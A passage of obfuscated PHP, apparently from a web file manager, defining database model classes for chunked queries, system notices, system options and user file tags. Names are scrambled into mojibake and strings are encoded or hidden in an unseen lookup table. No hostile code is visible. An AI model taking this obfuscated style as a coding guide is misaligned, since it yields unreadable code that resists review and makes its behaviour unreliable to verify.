(is_array($ïó½é›æ) && count($ïó½é›æ) == 2 && $ïó½é›æ[0] == $’µ…ºİ¡[437] && is_string($ïó½é›æ[1]) && substr($ïó½é›æ[1], 0, 1) == $’µ…ºİ¡[438] && substr($ïó½é›æ[1], strlen($ïó½é›æ[1]) - 1, 1) == $’µ…ºİ¡[438]) { $ªë·âùş = !0; $µ¾’Âµª = is_string($ñÚ…ÎÒ¶) ? $ñÚ…ÎÒ¶ : $Èú¡È£ì; $ÉÏÊ¥Êı = substr($ïó½é›æ[1], 1, strlen($ïó½é›æ[1]) - 2); $ÉÏÊ¥Êı = $this->db->escapeString($ÉÏÊ¥Êı); if (!strpos($µ¾’Âµª, $’µ…ºİ¡[10])) { $µ¾’Âµª = $’µ…ºİ¡[439] . $µ¾’Âµª . $’µ…ºİ¡[439]; } $ïô¸£ŠÍ = $’µ…ºİ¡[215] . $ÉÏÊ¥Êı . $’µ…ºİ¡[215]; $ÉÏÊ¥Êı = str_replace(array($’µ…ºİ¡[10], $’µ…ºİ¡[440], $’µ…ºİ¡[11]), $’µ…ºİ¡[441], $ÉÏÊ¥Êı); if ($·¿–ïÇÙ[$’µ…ºİ¡[442]]) { $ïô¸£ŠÍ = $’µ…ºİ¡[443] . $ÉÏÊ¥Êı . $’µ…ºİ¡[444]; if ($·¿–ïÇÙ[$’µ…ºİ¡[445]]) { $ïô¸£ŠÍ = $’µ…ºİ¡[444] . $ÉÏÊ¥Êı . $’µ…ºİ¡[443]; } } $áÊ•Ôî»[$ï‹®Ú¯] = $’µ…ºİ¡[446] . $µ¾’Âµª . $’µ…ºİ¡[447] . $ïô¸£ŠÍ . $’µ…ºİ¡[448]; $ï‹®Ú¯++; continue; } if (is_array($ïó½é›æ)) { $Èú¡È£ì = is_string($ñÚ…ÎÒ¶) ? $ñÚ…ÎÒ¶ : $Èú¡È£ì; $ïó½é›æ = $this->parseWhereLike($ïó½é›æ, $Èú¡È£ì, !0, $ªë·âùş); } if (is_numeric($ñÚ…ÎÒ¶)) { $áÊ•Ôî»[$ï‹®Ú¯] = $ïó½é›æ; $ï‹®Ú¯++; } else { $áÊ•Ôî»[$ñÚ…ÎÒ¶] = $ïó½é›æ; } } if ($ªë·âùş && !$Ìõ¥—áˆ) { } return $áÊ•Ôî»; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ô­•¯Îû = array()) { $ôìÒº¬¢ =& $_SERVER[ú‡®¯¨±]; $®ÔÚÙ¼ª = self::SQL_WHERE_IN_CHUNK; $®Ü˜ùç¨ = $this->optionsValue(); $´ùéí°Ù = $this->findWhereField($®Ü˜ùç¨); if (!$´ùéí°Ù || isset($®Ü˜ùç¨[$ôìÒº¬¢[347]]) || isset($®Ü˜ùç¨[$ôìÒº¬¢[408]])) { return parent::select($ô­•¯Îû); } $÷¦Ÿûó = $®Ü˜ùç¨[$ôìÒº¬¢[330]][$´ùéí°Ù][1]; $÷¦Ÿûó = is_array($÷¦Ÿûó) ? $÷¦Ÿûó : array(); $ê„ €ìÓ = null; for ($¼¸µÜâ½ = 0; $¼¸µÜâ½ < count($÷¦Ÿûó); $¼¸µÜâ½ += $®ÔÚÙ¼ª) { $ÑÒÏíßï = array_slice($÷¦Ÿûó, $¼¸µÜâ½, $®ÔÚÙ¼ª); if (!is_array($ÑÒÏíßï) || count($ÑÒÏíßï) == 0) { break; } $®Ü˜ùç¨[$ôìÒº¬¢[330]][$´ùéí°Ù][1] = $ÑÒÏíßï; $this->optionsValue($®Ü˜ùç¨); $÷òàÀŠ = parent::select($ô­•¯Îû); if (!$÷òàÀŠ) { continue; } $ê„ €ìÓ = is_array($ê„ €ìÓ) ? $ê„ €ìÓ : array(); $ê„ €ìÓ = array_merge($ê„ €ìÓ, $÷òàÀŠ); } return $ê„ €ìÓ; } public function delete($Şº™‘Šœ = array()) { $Èƒ×Çœû =& $_SERVER[ú‡®¯¨±]; $¼øÜƒ˜ó = self::SQL_WHERE_IN_CHUNK; $Õõ¤·•ş = $this->optionsValue(); $™öİõ²ã = $this->findWhereField($Õõ¤·•ş); if (!$™öİõ²ã) { return parent::delete($Şº™‘Šœ); } $ı®¬ÈÓ = 0; $´µÇÓË¤ = $Õõ¤·•ş[$Èƒ×Çœû[330]][$™öİõ²ã][1]; $´µÇÓË¤ = is_array($´µÇÓË¤) ? $´µÇÓË¤ : array(); for ($„¡ù¢¾‚ = 0; $„¡ù¢¾‚ < count($´µÇÓË¤); $„¡ù¢¾‚ += $¼øÜƒ˜ó) { $ªğú¢½ = array_slice($´µÇÓË¤, $„¡ù¢¾‚, $¼øÜƒ˜ó); if (!is_array($ªğú¢½) || count($ªğú¢½) == 0) { break; } $Õõ¤·•ş[$Èƒ×Çœû[330]][$™öİõ²ã][1] = $ªğú¢½; $this->optionsValue($Õõ¤·•ş); $ı®¬ÈÓ += parent::delete($Şº™‘Šœ); } return $ı®¬ÈÓ; } private function findWhereField($Ì´‰‘©§) { $…Û¨§àÇ =& $_SERVER[ú‡®¯¨±]; $«˜ù•­• = self::SQL_WHERE_IN_CHUNK; if (!is_array($Ì´‰‘©§) || !is_array($Ì´‰‘©§[$…Û¨§àÇ[330]])) { return !1; } foreach ($Ì´‰‘©§[$…Û¨§àÇ[330]] as $ÃäµÙÂÏ => $Ûü¹úÁé) { if (is_array($Ûü¹úÁé) && isset($Ûü¹úÁé[0]) && is_string($Ûü¹úÁé[0]) && strtolower($Ûü¹úÁé[0]) == $…Û¨§àÇ[7] && is_array($Ûü¹úÁé[1]) && count($Ûü¹úÁé[1]) > $«˜ù•­•) { ignore_timeout(); return $ÃäµÙÂÏ; } } return !1; } public function setMasterDB($¹ëıÜ¦ø = true) { think_config($_SERVER[ú‡®¯¨±][449], $¹ëıÜ¦ø); } } goto eİ¿¤¯»–Ş; eîî°ƒßßÀ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\x6e\157\164\151\x63\x65\x4c\151\163\164"; public $field = array("\156\x61\155\145", "\x63\x6f\156\x74\x65\156\x74", "\x61\165\164\150", "\x6d\x6f\x64\x65", "\164\151\155\x65", "\x74\x79\x70\145", "\x6c\145\x76\145\x6c", "\x65\156\141\142\x6c\145", "\163\157\x72\x74"); public function listData($Ì¸«ÖòÁ = false, $©ùÎºÉÙ = "\163\157\x72\x74", $É»«”î = false) { return parent::listData($Ì¸«ÖòÁ, $©ùÎºÉÙ, $É»«”î); } public function add($ıÕÎ²ØÌ) { $’§÷¢Éä =& $_SERVER[ú‡®¯¨±]; $ş¬»¨ü = time(); if ($ıÕÎ²ØÌ[$’§÷¢Éä[16]] == $’§÷¢Éä[2343]) { $ş¬»¨ü = strtotime($ıÕÎ²ØÌ[$’§÷¢Éä[196]]); } $ıÕÎ²ØÌ[$’§÷¢Éä[196]] = $ş¬»¨ü; return parent::insert($ıÕÎ²ØÌ); } public function update($£ÍØîë€, $¬±‹¯åë) { $íÅÁ„î» =& $_SERVER[ú‡®¯¨±]; $™æ«Ğâ³ = $this->listData($£ÍØîë€); if (!$™æ«Ğâ³) { return !1; } $÷¡Óãè = time(); if ($¬±‹¯åë[$íÅÁ„î»[16]] == $íÅÁ„î»[2343]) { $÷¡Óãè = strtotime($¬±‹¯åë[$íÅÁ„î»[196]]); } $¬±‹¯åë[$íÅÁ„î»[196]] = $÷¡Óãè; return parent::update($£ÍØîë€, $¬±‹¯åë); } public function remove($Æ‹‘»Ì) { $éåîöï = $this->listData($Æ‹‘»Ì); if (!$éåîöï || $éåîöï[$_SERVER[ú‡®¯¨±][181]]) { return !1; } return parent::remove($Æ‹‘»Ì); } public function sort($˜ÒÂÑ‚ê, $Ú›–™Î¯) { return parent::update($˜ÒÂÑ‚ê, $Ú›–™Î¯); } public function enable($Ãšº€èí, $Á‘ÆÄõª) { return parent::update($Ãšº€èí, array($_SERVER[ú‡®¯¨±][2344] => $Á‘ÆÄõª)); } private function initUserOption() { $ë€¼ĞÇœ =& $_SERVER[ú‡®¯¨±]; $this->optionType = $ë€¼ĞÇœ[2345]; $this->modelType = $ë€¼ĞÇœ[2346]; $this->field = array($ë€¼ĞÇœ[2347], $ë€¼ĞÇœ[32], $ë€¼ĞÇœ[196], $ë€¼ĞÇœ[33], $ë€¼ĞÇœ[2348], $ë€¼ĞÇœ[805], $ë€¼ĞÇœ[222]); } public function userNoticeGet($«Çƒçëæ = false) { $this->initUserOption(); return parent::listData($«Çƒçëæ, $_SERVER[ú‡®¯¨±][453], !0); } public function userNoticeAdd($áÌã¶µÄ) { $³ÏµŠ²È =& $_SERVER[ú‡®¯¨±]; $this->initUserOption(); $à«Šöïæ = $this->findByKey($³ÏµŠ²È[2347], $áÌã¶µÄ[$³ÏµŠ²È[453]]); if ($à«Šöïæ) { return !0; } $¼şÍ«ŒÅ = array($³ÏµŠ²È[2347] => $áÌã¶µÄ[$³ÏµŠ²È[453]], $³ÏµŠ²È[32] => $áÌã¶µÄ[$³ÏµŠ²È[32]], $³ÏµŠ²È[196] => $áÌã¶µÄ[$³ÏµŠ²È[196]], $³ÏµŠ²È[33] => isset($áÌã¶µÄ[$³ÏµŠ²È[33]]) ? $áÌã¶µÄ[$³ÏµŠ²È[33]] : 1, $³ÏµŠ²È[2348] => isset($áÌã¶µÄ[$³ÏµŠ²È[2348]]) ? $áÌã¶µÄ[$³ÏµŠ²È[2348]] : 0, $³ÏµŠ²È[805] => 0, $³ÏµŠ²È[222] => 0); return parent::insert($¼şÍ«ŒÅ); } public function userNoticeEdit($óÎñ÷Äà, $øıîá€) { $this->initUserOption(); return parent::update($óÎñ÷Äà, $øıîá€); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\145\155\x5f\x6f\x70\x74\x69\157\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\162\157\x6c\x65", "\x72\x6f\x6c\145\x47\x72\157\165\160", "\x72\x65\x67\151\x73\x74", "\x65\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($¡”ç¦ÔÂ) { return "\123\x79\x73\x74\145\155\117\x70\x74\x69\x6f\x6e\137{$¡”ç¦ÔÂ}"; } protected function optionDefault($Û®™’¹Ç = '') { $¦ÀŒ¾§ =& $_SERVER[ú‡®¯¨±]; if ($Û®™’¹Ç == $¦ÀŒ¾§[12]) { return $GLOBALS[$¦ÀŒ¾§[6]][$¦ÀŒ¾§[435]]; } } } class SystemRecordModel extends ModelBaseLight { } goto DÅ³‚µµ¼İ; cÅ™‹ÓƒÖ¥: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($ë‘…¬Å„) { $ÍÌØé‡ =& $_SERVER[ú‡®¯¨±]; return array($ÍÌØé‡[2017] => array($ÍÌØé‡[2408] . USER_ID, $ÍÌØé‡[2018])); } protected function listData() { $ûÃÛ¡¶„ =& $_SERVER[ú‡®¯¨±]; $øŠŸÄŸ = array($ûÃÛ¡¶„[1699] => USER_ID, $ûÃÛ¡¶„[536] => array($ûÃÛ¡¶„[2021], 0)); $€õ…—‡Ã = $ûÃÛ¡¶„[2409]; $ú„µÛ˜ş = $this->field($€õ…—‡Ã)->where($øŠŸÄŸ)->order($ûÃÛ¡¶„[2024])->select(); return $ú„µÛ˜ş ? $ú„µÛ˜ş : array(); } protected function addToTag($ËÏä€, $†éÆÜ‘º) { $øììá¼û =& $_SERVER[ú‡®¯¨±]; if (!Model($øììá¼û[2168])->listData($†éÆÜ‘º)) { return !1; } if (is_numeric($ËÏä€)) { $û÷¦ Ú« = Model($øììá¼û[880])->pathInfo($ËÏä€); if (!$û÷¦ Ú«) { return !1; } } else { $û÷¦ Ú« = IO::infoSimple($ËÏä€); if (!$û÷¦ Ú«) { return !1; } $˜ÏÏ›¸€ = $û÷¦ Ú«[$øììá¼û[32]]; $óŠû²œí = $û÷¦ Ú«[$øììá¼û[33]]; if (isset($û÷¦ Ú«[$øììá¼û[463]])) { $óŠû²œí = $û÷¦ Ú«[$øììá¼û[463]] == $øììá¼û[90] ? $øììá¼û[77] : $øììá¼û[226]; } } $ôèïìş = array($øììá¼û[1699] => USER_ID, $øììá¼û[536] => $†éÆÜ‘º, $øììá¼û[473] => $ËÏä€, $øììá¼û[474] => $óŠû²œí ? $óŠû²œí : $øììá¼û[468], $øììá¼û[472] => $˜ÏÏ›¸€ ? $˜ÏÏ›¸€ : $øììá¼û[12], $øììá¼û[1910] => 0); if ($this->where($ôèïìş)->find()) { return !1; } return $this->add($ôèïìş); } protected function removeFromTag($ÇëŒİÜ‚, $âªš’èˆ) { $µ©™˜ç =& $_SERVER[ú‡®¯¨±]; if (!Model($µ©™˜ç[2168])->listData($âªš’èˆ)) { return !1; } if (is_array($ÇëŒİÜ‚)) { $ÇëŒİÜ‚ = array($µ©™˜ç[7], $ÇëŒİÜ‚); } $’ö­ğÈÚ = array($µ©™˜ç[1699] => USER_ID, $µ©™˜ç[536] => $âªš’èˆ, $µ©™˜ç[473] => $ÇëŒİÜ‚); return $this->where($’ö­ğÈÚ)->delete(); } protected function removeByTag($Ú¸®‡€) { $Æ–ê‰‡î =& $_SERVER[ú‡®¯¨±]; if (!$Ú¸®‡€) { return !1; } $†ÜŒÕ‚§ = array($Æ–ê‰‡î[1699] => USER_ID, $Æ–ê‰‡î[536] => $Ú¸®‡€); return $this->where($†ÜŒÕ‚§)->delete(); } protected function removeBySource($”ŒÖº×) { $¯Åë¥† =& $_SERVER[ú‡®¯¨±]; if (is_array($”ŒÖº×)) { $”ŒÖº× = array($¯Åë¥†[7], $”ŒÖº×); } $“ğÄ­­ = array($¯Åë¥†[1699] => USER_ID, $¯Åë¥†[536] => array($¯Åë¥†[1070], 0), $¯Åë¥†[473] => $”ŒÖº×); return $this->where($“ğÄ­­)->delete(); } }